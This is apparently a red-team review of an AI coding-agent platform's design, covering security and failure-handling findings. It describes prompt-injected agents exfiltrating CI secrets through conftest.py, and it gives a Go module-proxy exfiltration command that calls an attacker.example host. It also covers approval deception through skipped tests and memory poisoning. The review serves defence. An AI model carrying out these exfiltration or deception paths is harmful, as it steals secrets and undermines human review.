# R2: Red Team Review

**Reviewer:** R2 (Phase 3) · **Date:** 2026-10-24 · **Inputs:** shared context (D-01..D-26 as amended),
`spec/00-contracts/` at the FROZEN.md versions (C-STATE 1.7.0, C-IDS 1.10.0, C-MSG 1.4.0, C-DEF 2.4.0,
C-ART 1.8.0, with the CCR-01-01..05 batch treated as accepted), every Phase 2 section 01–11, and
`spec/_coordination/*`.

**Method.** I assumed the design is built exactly as written and runs for three years at the stated scale. I
walked every threat class in `09-security/threat-model.md` against the designs that implement it. I killed each
component at the worst moment against the reference workflow code (`01-orchestration/reference/`) and the
contracts. I walked five personas through a bad day and reviewed all 32 prototype screenshots. I looked for
unbounded spend, and I re-checked 13 load-bearing external claims against primary sources on 2026-10-24.
Every finding below quotes or points to text I confirmed in the spec.

**Out of scope, per the orchestrator.** Findings already covered by the pending fix round are not repeated:
tenant tables without RLS, mis-assigned registry grants, memory.sql grant order, audit.sql ownership, scope
vocabulary, WS-09 bucket policies vs multipart and the third exec role, and the WS-11 tunnel default. I also
did not re-argue the accepted challenges (D-07, D-08, D-12, D-26, ADR-01-001). The one exception is that
F-series failures in the ADR-01-001 reference code are reported as code defects, not as a challenge to the
decision.

## Summary

| Severity | Count |
|---|---|
| Critical | 2 |
| High | 19 |
| Medium | 36 |
| Low | 7 |
| **Total** | **64** |

IDs are grouped by lens rather than numbered in order of appearance. Gaps in the order within each section
are intentional.

The capability model holds up well: I could not find a path by which a prompt-injected agent pushes directly,
approves its own work, reads another tenant's repos through repo-mirror or context-mcp, or reuses a stolen
token from outside the sandbox. The two critical findings are elsewhere:

1. **Replicant's own pushes run agent-written code in the target repo's CI, with that repo's secrets,
   before any human has looked at it** (R2-001). The threat model only considers CI *after merge*.
2. **The Runner idempotency contract breaks on the first retry** (R2-002). The idempotency digest covers a
   per-attempt trace span, so "Runner crash mid-create" fails the job and orphans the run. That is the exact
   failure D-04 exists to prevent.

A wider failure-handling gap follows close behind. In the reference workflow, any activity that exhausts its
retries fails the whole workflow execution with no compensation (R2-010). As a result, "Temporal unavailable
for an hour", "memory-service down", and "gateway down for 40 minutes" all end with every in-flight job
failed. `recovery.md` says those jobs pause and resume.

On visual design, the prototype is crafted rather than generic, with no banned patterns. It does ship
overflow defects at both target widths and an overloaded accent colour, and it lacks the failure states
operators will spend their bad days in (§4.2).

---

## 1. Security (lens 1)

### R2-001 · Critical · Replicant pushes run agent-written code in target-repo CI with secrets, before human review

- **Sections:**
  - `09-security/threat-model.md` §4.2 T-PI-02, §5.1 attack tree.
  - `09-security/agent-capabilities.md` §8: "Edit `.github/workflows` to exfiltrate CI secrets **after merge**".
  - `07-control-plane-and-ux/schemas/examples/gate-rules.global.yaml`: `publish.medium` applies only at
    `risk_at_least: medium`.
  - `07-control-plane-and-ux/github-app.md` §10 step 1: "or, when the job had no publish gate, the digest of
    the diff the `risk.classify` activity evaluated".
  - `01-orchestration/graphs/README.md` takeover row: "push the branch (draft, no PR)".
  - `05-qa`: QA runs inside the sandbox, but the target repo's own CI runs on GitHub.
- **Scenario.**
  1. An outside contributor files an issue on an internal repo: "Flaky refund test; the fixture in
     `tests/conftest.py` resets the clock wrong."
  2. The injected planner names `tests/conftest.py`, so `plan.outside_paths` does not fire.
  3. The implementer adds 12 lines to `conftest.py` that read `os.environ` and POST it to an attacker host.
  4. Risk is `low`. The diff has fewer than 50 lines, no manifest, and no sensitive path; `conftest.py`,
     `Makefile`, `scripts/**`, `noxfile.py`, `pyproject.toml` `[tool.*]` hooks, and `.husky/**` are in no
     rule. So no publish gate opens.
  5. The Publisher creates the branch and the PR with an installation token.
- **Why it fails.**
  - GitHub runs `pull_request` and `push` workflows for same-repository branches with repository secrets.
  - Events created with a GitHub App installation token *do* trigger workflows. Only `GITHUB_TOKEN` events
    are suppressed. I re-checked this on 2026-10-24: "you can use a GitHub App installation access token …
    `pull_request` workflows run automatically when automation creates or updates a pull request, without
    the approval prompt" (docs.github.com, *Triggering a workflow*).
  - CI runners have internet egress and usually hold deploy credentials (cloud OIDC roles, registry tokens,
    `NPM_TOKEN`).
  - The sandbox's careful no-egress design is bypassed by handing the code to a runner that has egress.
  - The same path exists for:
    - every low-risk repair push (`push_update`, gated only "when [risk rules] say so", T-APR-01);
    - every takeover branch push. That push is ungated *by design*, and its content is whatever the
      injected agent left in the workspace.
  - Required reviews at merge do not help, because CI runs at push time.
- **Fix.**
  1. Add a deterministic risk class `ci_executed_paths` at `critical`. It must be impossible to remove at the
     tenant layer, and it applies to every publish, repair push, and takeover push. The base list:
     - `**/conftest.py`, `**/Makefile`, `**/*.mk`, `**/justfile`, `**/Taskfile*`;
     - `scripts/**`, `ci/**`, `.ci/**`;
     - `**/package.json` `scripts`;
     - `pyproject.toml`, `setup.py`, `setup.cfg`, `tox.ini`, `noxfile.py`;
     - `**/build.gradle*`, `**/pom.xml`;
     - `.husky/**`, `.pre-commit-config.yaml`;
     - `Jenkinsfile`, `.gitlab-ci.yml`, `.circleci/**`, `.buildkite/**`, `azure-pipelines.yml`.

     Tenants extend the list from their CI config. WS-04's ecosystem indexer can derive extra entries by
     parsing the repo's workflow files for `run:` commands.
  2. Make the takeover push a gated action. It needs its own `takeover_push` gate, or it is restricted to
     pushing into a fork, or to a branch prefix that tenants exclude from CI (`replicant-takeover/**` plus an
     org ruleset). Document the CI interaction in `agent-capabilities.md` §8.
  3. Make "test files changed" (`**/test*/**`, `*_test.go`, `*.spec.ts`) at least `medium`. Tests are code
     that CI executes.
  4. In `threat-model.md`, add T-PI-13 "agent code executed by target CI pre-review", rated L4/I4. Today the
     residual risk is unbounded, because any tenant whose CI holds production deploy credentials is exposed.
- **Owner:** WS-09 (threat and rules), WS-07 (gate rules, Publisher), WS-01 (takeover gate).

### R2-003 · High · The Go module mirror is a working exfiltration channel to attacker-controlled hosts

- **Sections:**
  - `09-security/agent-capabilities.md` §7: "Upstreams | Only … `proxy.golang.org` …"; "First-seen names |
    … blocked … for `qa`/`implementer` runs of tenants marked `restricted`; logged for all"; "Rate limit
    ≤ 50 cache misses per run per minute".
  - `threat-model.md` T-SC-02 residual "L2 / I2 … low-bandwidth covert channel remains".
  - `02-execution/fast-path.md` §6 row 1 lists "first-seen-name blocking" as a default policy, which
    contradicts agent-capabilities.
- **Scenario.** The injected implementer runs
  `go list -m attacker.example/$(base32 <secret-chunk>)@latest` 40 times. The artifactory `go-virtual`
  misses and asks `proxy.golang.org`, which fetches `https://attacker.example/<chunk>?go-get=1` on demand
  from the origin. The attacker reads the data in its HTTP access log. At 50 misses per minute and about 150
  bytes per path, that is roughly 7 KB per minute.
- **Why it fails.**
  - "The mirror does not fetch from origin VCS" is true of Artifactory, but its upstream does exactly that.
  - The channel is not covert or low-bandwidth. It is an HTTP callback to an arbitrary domain. In 10
    minutes it carries `additional_repos` secrets or any value the run can read.
  - The run token is ≤ 60 minutes and internal-only, so the token itself has low value. Source code from a
    `restricted` `additional_repo` does not: tenants that are not `restricted` can hold it via
    `additional_repos` from another tenant's internal repo. The same applies to secrets found in the repo.
- **Fix.**
  - Make first-seen module paths blocked for **all** tenants for Go. Block Go module hosts outside an
    allowlist of VCS hosts (`github.com/<allowed orgs>`, `golang.org/x`, `google.golang.org`, `gopkg.in`)
    at the Artifactory remote (exclude patterns).
  - Treat any mirror 404 for a host outside the allowlist as a P2 security event.
  - Do the same for npm scopes and PyPI names. Their registries don't call back to origin, but squatting
    plus download stats is a slower channel.
  - Reconcile fast-path §6 with agent-capabilities §7, and re-rate T-SC-02 L3/I3.
- **Owner:** WS-09, WS-02.

### R2-004 · High · Approval records hold free text in the WORM audit bucket; the contracts say they never do

- **Sections:**
  - `00-contracts/artifact-layout.md` rule 4a: "Approval records … never contain secrets or memory text
    (rule 5), so they are never purged".
  - The `approval_record` row there: "packet copy plus decision".
  - `07-control-plane-and-ux/approvals.md` §3 packet: `job.title` is copied from untrusted issue text.
  - The decision comment is "required … ≤ 8,000 chars" for Slack reject or changes.
  - `08-observability/session-capture.md` §8.1 contradicts C-ART: "S3 `audit` approval records … comment
    text | `replicant-leak-purge` holds `s3:BypassGovernanceRetention` …".
  - `10-data-platform/lifecycle.md` decisions: "Audit records survive [offboarding]: they hold IDs, not
    content, under the platform `audit` key".
- **Scenario.** An approver pastes a production DSN into a reject comment, or an issue title contains a
  customer's email. The approval record is written under governance lock for 2 years, or 7 years under the
  `r7y` policy.
  - The security responder opens a `LeakPurge`, but C-ART scopes the bypass to `tenants/*/jobs/*/history/`,
    so the approval-record step fails with 403. The two sections disagree on whether the step exists at
    all.
  - Separately, when the tenant offboards, its KMS keys are crypto-shredded but the approval records, under
    the platform key, survive with tenant text in them.
- **Why it fails.** The contract's invariant, "no free text in the audit bucket", is false for the one
  object type that is guaranteed to carry human free text. Both purge and offboarding rely on the invariant.
- **Fix.** Pick one of two:
  - (a) Make `approval_record` reference-only: the packet digest plus decision enum, principal, channel,
    `decided_at`, and a `comment_sha256`. The comment and title live in a tenant-keyed, non-locked
    `artifacts` object referenced by digest. Then the invariant is true.
  - (b) Encrypt the free-text fields of the record with the tenant key (envelope, field-level) so
    offboarding shreds them, and drop the record from purge scope.

  I recommend (a). Either way, fix C-ART rule 4a, session-capture §8.1, and lifecycle.md together.
- **Owner:** WS-00 (C-ART), WS-07, WS-08.

### R2-005 · High · Leak purge: governance bypass vs crypto-shredding the job payload key (the requested evaluation)

- **Sections:**
  - `00-contracts/artifact-layout.md` rule 4a.
  - `_coordination/contract-change-requests.md` (adjudication: bypass scoped to `history/` plus two-person
    approval; crypto-shred recorded as the alternative).
  - `01-orchestration/adr/010-tenant-routed-payload-codec…`.
  - `09-security/secrets.md` §6: "Data keys are cached per tenant for 5 minutes (at most 10,000 payloads
    per key)".
  - `10-data-platform/adr/009-audit-object-lock-governance.md`.
- **Assessment of crypto-shredding: not implementable under the current codec.**
  - No *job* payload key exists. A data key is per tenant and shared by every job of that tenant for 5
    minutes.
  - Each payload carries its wrapped data key inline. Anyone with `kms:Decrypt` on the tenant key can
    unwrap it, so "shredding" the job's DEK means deleting the tenant CMK. That destroys every tenant
    artifact and breaks replay of every open workflow of that tenant.
  - Making it work needs both of the following, and backups still hold the key for 35 days (PITR) or 12
    months (backup account), which defeats the shred:
    - per-job DEKs stored outside the payload, in a deletable keystore;
    - a change to every payload's metadata format. That is a codec change under live 30-day workflows,
      so it needs a dual-read period.
  - Per-job KMS keys cost about $1 per key per month. At about 110k jobs a year that is about $110k a
    month, and it exceeds the default per-region key quota. It is not viable.
- **Assessment of the governance bypass: workable but weaker than it looks.**
  - The bypass is a standing IAM permission on `replicant-leak-purge`. The two-person approval is a
    *workflow* gate, not an AWS control. Anyone who can run code as `ops-worker` (ADV-7) can bypass
    retention on every history export without the gate.
  - Governance mode also blocks moving the audit bucket to compliance mode, which WS-08/WS-09 may need.
  - A legal hold on an object, which an auditor may place, blocks deletion even with the bypass. The purge
    workflow does not handle that case. I verified the Object Lock semantics on 2026-10-24.
- **Better option: keep secret-bearing payloads out of WORM storage entirely.** Split `workflow_history_export`
  in two:
  1. `audit` (Object Lock): the event skeleton. Event types, IDs, timestamps, activity types, Update IDs,
     and the **sha256 of each payload**, with no payload bodies. This is never purged, and the audit bucket
     can then move to compliance mode.
  2. `artifacts` (tenant key, no lock, `r2y`): the full codec-encrypted history, used for replay testing
     (`versioning.md` §8) and forensics. It is purged by the normal rule-4a rewrite and shredded at
     offboarding.

  With this split, no principal anywhere holds `s3:BypassGovernanceRetention`. Integrity of the purgeable
  copy is still provable against the locked digests.
- **Fix.** Adopt the split. Remove `BypassGovernanceRetention` from every role, and move the audit bucket to
  compliance mode after the 30-day trial. Until then, if the bypass stays, do two things:
  - Grant it through a separate role `replicant-leak-purge-bypass`. That role is assumable only with an STS
    session tag issued by an approval Lambda after two distinct Okta principals approve, with
    `MaxSessionDuration` of 15 minutes.
  - Add legal-hold detection to `leak.rewrite_s3_objects`.
- **Owner:** WS-08 (export), WS-09 (IAM), WS-00 (C-ART 4a), WS-10 (bucket mode).

### R2-006 · High · The deterministic "tests deleted or skipped vs base" control has no producer

- **Sections:**
  - `threat-model.md` T-PI-08: "test-count delta vs base is a deterministic fact in the packet".
  - risk rule `tests.deleted_or_skipped` (`risk-rules.global.yaml`). Its predicate schema
    (`policy-risk-rules.schema.json` L238) says "QA harness reports tests deleted or newly skipped vs
    base_sha".
  - `05-qa/schemas/qa-report.schema.json`: no base comparison field.
  - The packet example (`approvals.md` §3) has `"tests_skipped": 3` with no baseline.
  - The verifier (`nodes/core.py`) has no test-delta check.
- **Scenario.** The injected implementer changes `t.Run(...)` to `t.Skip("flaky")` in the test that would
  catch its bug, or deletes the test file. QA passes, with 1,284 passed and 3 skipped. The risk rule never
  fires because nothing computes the predicate. The approver sees "Passed".
- **Why it fails.** One of the four controls the threat model lists against approval deception (T-PI-04,
  T-PI-08) does not exist anywhere in WS-05 or WS-01.
- **Fix.**
  - WS-05 adds `test_inventory` to `qa_report`: test IDs from JUnit, plus a static scan of test files in the
    diff for deletions and new skip markers (`t.Skip`, `@pytest.mark.skip`, `it.skip`, `xit`, `@Disabled`).
  - Base-side IDs come from either a cached `base_sha` inventory (per repo and `base_sha`, built by the
    first QA run) or a static parse of the base tree.
  - The verifier computes `deleted_or_skipped_tests` deterministically from the diff even when QA is skipped.
  - The packet shows "Δ vs base: −1 test, +1 skip" in the QA panel.
- **Owner:** WS-05 (producer), WS-01 (verifier), WS-07 (packet).

### R2-007 · Medium · Approval UI omits the "agent-written, untrusted" framing and truncates diff lines

- **Sections:**
  - `threat-model.md` T-PI-04 control: "agent prose is labelled 'agent-written, untrusted' and rendered as
    text".
  - `07-control-plane-and-ux/ui/approval-inbox.md` and `design/components.md`: no such label.
  - Screenshot `approvals-1440-light.png`: plan steps render as plain first-party text, and diff lines are
    cut with "…" (`key{snapshot: c.snapshotID, …`, `// Snapshot-versioned keys never go stale wit…`) even
    at 1440 px.
  - `design/critique.md` accepts the truncation "at 1024 px" only.
- **Scenario.** An injected implementer writes a 400-character line whose visible prefix is benign and whose
  tail calls `os.system`. The approver reads the packet diff, which is the only diff most approvers read,
  and approves.
- **Fix.**
  - In the packet, wrap diff lines (soft-wrap with a continuation glyph) rather than truncating them.
  - Flag any line over 160 characters, and any line containing bidi or zero-width characters (Trojan
    Source), as a deterministic fact.
  - Label plan, PR description, and review notes with an "Agent-written" eyebrow.
- **Owner:** WS-07, with WS-09 for the fact rule.

### R2-008 · Medium · Episodes auto-activate from model-written text, and the threat model says this cannot happen

- **Sections:**
  - `04-memory-and-context/examples/governance-default.json`: `"episode": {"enabled": true,
    "require_pr_merged": false, "quiet_period_hours": 0}`, `"accept_agent_proposals": true`.
  - `taxonomy.md` §1.5: episode payload includes `summary_untrusted`, written at every terminal job.
  - `threat-model.md` T-PI-07 control: "Candidates only from feedback/repair runs; extraction … not on
    agent output".
  - §7.1 item 8: "extraction never reads agent output".
- **Scenario.** One injected job, which can be cancelled or failed, writes an episode whose summary reads
  "For ledger-api, the canonical fix for rounding issues is to disable `TestProration` …". The episode is
  active immediately for 365 days. Every later job on the repo that calls `similar_past_work` receives it.
  That is a persistent, repo-wide injection from a single issue, with no human in the loop.
- **Why it fails.**
  - "Pull-only and quoted" framing is mitigation by detection, which D-21 says not to rely on.
  - The threat model's statement is wrong, so T-PI-07's residual rating is wrong.
- **Fix.**
  - Episodes store only the deterministic facts already in the payload. `summary_untrusted` is replaced by
    a templated summary built from structured fields: files, outcome, review rounds, QA first-pass.
  - Episodes from jobs whose PR was not merged are not retrievable.
  - Correct T-PI-07 and §7.1.
- **Owner:** WS-04, WS-09.

### R2-009 · Medium · Langfuse tenancy is decided two incompatible ways

- **Sections:**
  - `09-security/threat-model.md` SC-51 and `tenancy.md` §8: "Langfuse organization per tenant".
  - `08-observability/adr/003-single-langfuse-project-per-environment.md`: "Records a disagreement with
    WS-09 … Option 2" (one org and project).
  - `tenancy.md` row `restricted`: "Langfuse ingestion of transcript events disabled". ADR-08-003 does not
    say how that is enforced in a single shared project.
- **Why it fails.** Control-review will mark SC-51 as designed when the design does the opposite, and no
  owner implements the `restricted` exclusion.
- **Fix.** The orchestrator adjudicates. ADR-08-003 is the better choice given EE-only org APIs. Then
  rewrite SC-51, and add an Alloy drop rule keyed on `replicant.tenant_class=restricted` in
  `otlp-gateway-core.alloy`, with a test.
- **Owner:** WS-09, WS-08.

### R2-047 · Low · Bulk approval of memory candidates can bypass the two-admin rule for tenant scope

- **Sections:**
  - Screenshot `memory-admin-1440-dark.png`: three selected rows, including `tenant:payments`, with bulk
    "Approve" enabled.
  - `04-memory-and-context/write-path.md` W6: "tenant and org need two admins".
  - `07-control-plane-and-ux/ui/memory.md` §1 defines bulk actions without that rule.
- **Fix.** For tenant and org scope, bulk approve records one of the two required approvals and shows
  "1 of 2". The server enforces this, not only the UI.
- **Owner:** WS-07, WS-04.

### Attack narratives that do not succeed (checked)

| Attempt | Path tried | Why it stops |
|---|---|---|
| Push code | Sandbox `git push` to repo-mirror; reach github.com | upload-pack only (SC-59); no route; no token (SC-14) |
| Exfiltrate the gateway token | Read from agent container | agentd injects it; even if read (guest root), it works only on the internal NLB, is bound to `budget_usd`, and lives ≤ 60 min (but see R2-030 for revocation gaps) |
| Approve itself | Forge a Slack or GitHub decision; App APPROVE review | No channel credentials; V8 non-human reject; client wrapper has no APPROVE method; identity re-checked in handler |
| Poison memory via rules | Agent `memory_candidates` | W2 proposals are never auto-activated; `source.comment_id` cross-checked. Episodes are the hole (R2-008) |
| Reach another tenant | repo-mirror `repo_ids`; context-mcp; S3 ABAC; memory RLS | All enforce `tenant_id` plus `acting_for` live permission; R-04 (compromised Runner STS) is a fair residual |
| Edit CI workflows | `.github/workflows/**`, `.github/actions/**` | Publisher `ForbiddenPath`; App lacks `workflows`. Confirmed: GitHub rejects App pushes touching workflows without that permission (community docs, 2026-10-24). Note `.github/actions/**` is *not* covered by GitHub's own check, so the Publisher denylist is the only control there. Keep it in the base floor |

---

## 2. Failure modes (lens 2)

### R2-002 · Critical · A Runner retry after a crash mid-create gets `422 idempotency_key_reuse`

- **Sections:**
  - `00-contracts/runner-api.openapi.yaml` L46: "`spec_digest = sha256(JCS(RunSpec without run_grant))`".
  - `RunSpec.trace_context.traceparent` (L959).
  - `08-observability/telemetry-model.md` §2 row 5: "the activity also puts `trace_context.traceparent`
    (**the activity span**) in `RunSpec`".
  - `02-execution/runner-service.md` §2.2: "a retry always matches".
  - `runner-service.md` §10: "runner-api replica crash mid-create | … idempotent replay returns 200".
- **Scenario.**
  1. runner-api creates the AgentRun, then its pod is OOM-killed before responding.
  2. `runner.start_run` retries. The OTel Temporal interceptor opens a new `RunActivity` span per attempt,
     so the traceparent differs, and so `spec_digest` differs.
  3. runner-api returns 422 `idempotency_key_reuse`, which is non-retryable. The node fails, the job fails,
     and the first AgentRun keeps running with a valid grant. Nothing cancels it, because `start_run` never
     returned a run ID to the workflow.
- **Same breakage elsewhere.** The same happens on every Temporal point-in-time restore replay that
  `recovery.md` relies on.
- **Why it fails.** D-04's central promise ("retries never create duplicate runs") is preserved only by
  failing the job. The contract's own test vectors never vary the traceparent.
- **Fix.**
  - In C-RUNNER, exclude `trace_context` (and any per-attempt field) from `spec_digest`, exactly as for
    `run_grant`. Alternatively, set `trace_context.traceparent` to the deterministic T-5 span of the logical
    activity ID.
  - Add contract test RC-RUN-xx: same key, different traceparent → 200.
  - On any 422 reuse, the workflow cancels `derived("run", tenant, key)` before failing.
- **Owner:** WS-00 (C-RUNNER), WS-08, WS-02.

### R2-010 · High · Retry exhaustion of any activity fails the workflow execution with no compensation

- **Sections:**
  - `01-orchestration/reference/replicant_orchestration/context.py` `act()`: no exception handling.
  - `workflow.py` `run()`: catches only `asyncio.CancelledError` and `NodeFailed`.
  - `activity_options.py` `IO_INTERNAL`: `maximum_attempts=10`, 1 s initial ×2, capped at 60 s, so about
    4 minutes of backoff. The `schedule_to_close=30 min` therefore never matters for fast failures.
  - `10-data-platform/recovery.md`: "In-flight jobs: they pause for the outage (about 1–2 h), then resume".
  - `00-contracts/architecture.md` §5.1: "Not visible unless retries are exhausted". What happens after
    exhaustion is undefined.
- **Scenario.**
  - memory-service, the token broker, S3, or control-plane-api is down for 6 minutes. Every job inside
    `context.assemble`, `memory.*`, `notify.*`, `runner.read_result`, or `release.*` raises
    `ActivityError`. The workflow execution *fails*: `_finish` never runs, draft PRs are not closed, there is
    no `job.terminal` projection, and no memory outcome is recorded. The UI shows the job "running" until
    the reconciler notices.
  - A one-hour Temporal outage has the same effect. Schedule-to-close timers fire on recovery, so every
    in-flight `LLM` or `IO_INTERNAL` activity fails.
- **Why it fails.** The workflow's error model has no "infrastructure" path. The defined outcome
  `infrastructure_failure` (`graphs/README.md`) has no producer.
- **Fix.**
  - In `act()`, catch `ActivityError` and raise
    `NodeFailed("infrastructure_failure", retryable=True)`.
  - Give idempotent internal activities `maximum_attempts=0` (unlimited) with a schedule-to-close of hours,
    plus heartbeat-reported `waiting_dependency` sub-status projected to the job page.
  - Make "pause, don't fail" the documented default for dependency outages.
  - Add a scenario test that kills memory-service for 10 minutes.
- **Owner:** WS-01 (WS-10 to correct recovery.md).

### R2-011 · High · A `gate.decide` handler failure is permanent, so the approver's click is silently lost

- **Sections:**
  - `00-contracts/events-and-signals.md` §2.1 handler step 3 (`identity.check_decision`, "retry max 5").
  - `activity_options.py` `IDENTITY`: 0.5 s to 5 s, 5 attempts, about 8 s.
  - `01-orchestration/gates.md` §failures: "identity-service down | … the handler raises | the Update fails
    (**no history**); the sender retries; the gate stays open".
  - `10-data-platform/postgres.md`: Aurora failover "under 60 s".
- **Scenario.** Priya clicks Approve during an Aurora failover. identity-service is unavailable for 40 s.
  The validator has already *accepted* the Update, so the handler's failure is written to history as the
  Update's outcome. The outbox retries with the same Update ID, as C-MSG §3 requires, and Temporal returns
  the same failed outcome forever. The gate stays open, the UI says "Recording…" then shows an error, and
  the next click (a new Update ID) works only if Priya notices.
- **Why it fails.** "Update fails with no history" is false once the validator has accepted it. The ~8 s
  retry budget is shorter than a documented failover. A GitHub or broker outage during the live
  repo-permission check has no fallback (`identity.md` §10 covers Okta only).
- **Fix.**
  - The handler catches exhaustion and returns `{result: "denied", reason: "identity_unavailable",
    retryable: true}`.
  - Outboxes re-submit with a *new* Update ID derived as `decision_id + ":r" + n`. Dedupe stays on
    `decision_id` in V3.
  - Raise the `IDENTITY` budget above 90 s, map broker or GitHub failures to `identity_unverifiable`, and
    correct gates.md.
- **Owner:** WS-01, WS-07.

### R2-012 · High · A gateway or provider outage over ~35 minutes fails every running job at once

- **Sections:**
  - `03-agents-and-tools/gateway.md` §6.6: `GatewayUnavailable` after `unavailableAfterSeconds` 600 s, exit 21.
  - `01-orchestration/policies/repair-limits.yaml`: `run_retries.max_per_node: 2`, backoff 30 s and 60 s.
  - Shared retry budget with `NodeLost` and `Preempted`.
- **Scenario.** The enterprise gateway is down for 45 minutes. Up to 150 runs each burn three attempts,
  about 10 minutes plus about 90 s provisioning per attempt, then the node fails. All jobs end `failed`.
  The retries re-provision 150 sandboxes in a herd and re-run input staging and LLM context building.
- **Why it fails.** There is no circuit breaker, no platform-health hold, and no global pause. A platform
  dependency outage is charged to per-job retry budgets.
- **Fix.**
  - Classify `GatewayUnavailable`, `RepoFetchFailed` (mirror down), and `NodeLost` during a node-pool event
    as `platform_dependency`. These do not consume `run_retries`.
  - The node waits on a `gateway_health` Signal or poll in `waiting_dependency`. A token-bucket limiter
    (tenant-fair) controls restarts.
  - Add an operator "hold all starts" switch (see R2-016).
- **Owner:** WS-01, WS-03.

### R2-013 · Medium · Approval records and decision audit rows can be lost on Continue-As-New or close

- **Sections:**
  - `workflow.py`: `gates.write_approval_record` and `notify.gate_resolved` are started without being
    awaited. `_drain` waits only on projection handles.
  - `00-contracts/state-ownership.md`: the projector emits `audit.emit()` for gate events, Continue-As-New
    waits on projections with a 10-minute cap, and after that "the reconciler covers the gap" (snapshots
    only).
- **Scenario.** A reject ends the job, or a decision is followed by Continue-As-New. The pending activities
  are abandoned with the closed run, so no Object-Locked approval record is written. Separately, a Postgres
  outage longer than 10 minutes coinciding with Continue-As-New loses the `gate.decided` audit row,
  because the reconciler restores the timeline snapshot but not audit events.
- **Fix.**
  - Await the record and the audit emission before Continue-As-New or close.
  - Add an approval-record reconciler that scans closed gates in history exports and writes missing
    records, with `If-None-Match` so it is idempotent.
- **Owner:** WS-01, WS-08.

### R2-014 · Medium · A decision made before expiry is rejected when an outage delays it past expiry

- **Sections:** `events-and-signals.md` V10: "`workflow.now() < expires_at`". `GateDecideRequest.decided_at`
  exists but is unused. `recovery.md`: expiry timers "fire on recovery".
- **Scenario.** Priya approves at 10:00 a gate expiring at 10:30. Temporal is down from 09:55 to 11:00. On
  recovery the expiry timer and her Update race. Either the job is `expired` or she gets "This request
  expired".
- **Fix.** control-plane-api and adapters stamp a trusted `received_at` when writing the outbox row.
  V10 accepts the decision if `received_at < expires_at`. The expiry timer handler checks for pending
  outbox rows (a Query against the API) before expiring.
- **Owner:** WS-01, WS-07.

### R2-015 · Medium · The frozen Migration Handoff Protocol v1 fails or hangs the job, contrary to its spec

- **Sections:**
  - `01-orchestration/versioning.md` §6.4: "Handoff activity fails for 30 min … the job raises an operator
    alert and continues on N".
  - `workflow.py` `_migration_prologue`: no try/except, `IO_INTERNAL` exhaustion in about 4 minutes, then
    an unconditional `wait_condition(get_current_build_id() == target)`.
- **Scenario.**
  - control-plane-api is down for 5 minutes during a consented migration, so the workflow fails (R2-010).
  - Alternatively, the override call succeeds but routing never flips, for example because the target
    version was drained meanwhile. Then the workflow waits forever on N, holding its gate.
- **Why it matters now.** The prologue is FROZEN: every build must issue exactly this command sequence. A
  fix later needs protocol v2 and dual support.
- **Fix before relying on the freeze.** Wrap the activity, and add a timeout to the `wait_condition`
  (`workflow.wait_condition(..., timeout=timedelta(minutes=30))`). Both paths fall back to "continue on N +
  alert" as the spec says. Freeze v1 only after that.
- **Owner:** WS-01.

### R2-016 · High · Kill switches exist only per tenant, live in the database that may be down, and SC-48 is unmet

- **Sections:**
  - `09-security/threat-model.md` SC-48: "Kill switches: global, tenant, repo, bundle".
  - WS-07 specifies only `PUT /v1/admin/tenants/{t}/kill-switch` (`ui/admin.md`, `architecture.md` §7).
  - `06-releases-and-evals/promotion.md` §7.4: "Postgres unavailable | Rollback cannot commit. Fallback: the
    kill switch `tenancy.intake_paused`". That switch is a row in Postgres `tenancy`
    (`state-ownership.md`).
- **Scenario.** A bad bundle is opening PRs with broken code across 40 tenants, and control-plane-api is
  degraded. The operator must flip 40 switches through the API that is failing. The documented fallback
  depends on the failed component. "Publishing paused" has no defined effect on jobs already in
  `publishing` or with approved gates.
- **Fix.**
  - Add `PUT /v1/admin/kill-switch {scope: global|tenant|repo|bundle, intake, publishing, starts}`.
  - Mirror switch state to an out-of-band store (an AWS AppConfig feature flag or SSM parameter) that
    intake, the Publisher, and `runner.start_run` read with a 30 s cache. An operator can set it with the
    AWS CLI under break-glass.
  - Define "publishing paused": the Publisher activity raises a retryable `PublishingPaused`, and the job
    shows "Publishing paused by operators".
- **Owner:** WS-07, WS-06, WS-09.

### R2-030 · Medium · Runs on a partitioned (not dead) node are never revoked

- **Sections:**
  - `02-execution/lifecycle-and-failures.md` Risks: "until the shim sees the run is terminal (WS-03 shim
    checks run state on budget events)". `gateway.md` has no such check (§5.3 covers revocation sets).
  - `state-ownership.md`: the revocation list holds only runs "cancelled or terminal with
    `SecurityViolation`".
- **Scenario.** The node loses its control-plane link. The run is declared `NodeLost` and retried with a new
  `run_id`, but the original VM keeps calling the gateway and MCP servers with its unexpired token for up
  to 60 minutes, in parallel with the retry. That doubles spend and lets the old run keep reading.
- **Fix.** On every terminal phase, the controller calls runner-api, which adds the `run_id` to the
  revocation list and pushes `POST /internal/v1/revocations` to the shim, memory-mcp, and context-mcp.
- **Owner:** WS-02, WS-03, WS-09.

### R2-031 · Medium · A Publisher crash between branch creation and PR creation is undefined, and can fail the job

- **Sections:**
  - `07-control-plane-and-ux/github-app.md` §10 step 6: "`POST /git/refs` … (422 'Reference already exists'
    → compare and continue)". The retried commit has a new SHA (new signature timestamp), and the mismatch
    case is undefined.
  - Step 7 git-push fallback: non-fast-forward → `PushRejected`, non-retryable.
  - `recovery.md`: "publisher finds the existing branch/PR … and treats it as done".
- **Fix.** Read the ref first. If its head commit carries the `Replicant-Activity: <key>` trailer (as
  `push_update` already checks), reuse it. Otherwise force-update the replicant-owned branch, which is safe
  because the branch name is job-derived. Never surface `PushRejected` for Replicant's own branch.
- **Owner:** WS-07.

### R2-032 · Medium · Slack and GitHub decisions depend on the read model

- **Section:** `approvals.md` §decision flow step 2: "Look up the gate in `approvals.gates` (projection, for
  routing to `job_id` only)". The outbox is written in step 4. L476 claims projection lag affects "UI only".
- **Scenario.** During an Aurora failover or a projector backlog, a Slack click on a fresh gate gets 404 or
  503 and is not recorded. Adapter behaviour on 404 is undefined.
- **Fix.** Encode `job_id` in Slack `action_id` and value, and in the GitHub comment ref. Write the outbox
  row first, then route.
- **Owner:** WS-07.

### R2-033 · Medium · Node loss during a 40-minute QA run costs the full 40 minutes, and S3 throttling re-runs whole runs

- **Sections:**
  - `02-execution/lifecycle-and-failures.md` (`NodeLost` → ordinal+1 from scratch).
  - `02-execution/controller.md` uploader "8 attempts per object, bounded by `finalizeSeconds`", then
    retryable `ArtifactUploadFailed`. HEAD mismatches are treated as integrity failures. "SlowDown" appears
    nowhere in the spec.
- **Scenario.** S3 returns 503 SlowDown on a hot prefix during a burst of 150 finalizing runs. Uploads exhaust
  8 attempts, so `ArtifactUploadFailed` re-runs a 40-minute QA run, which adds more S3 load.
- **Fix.**
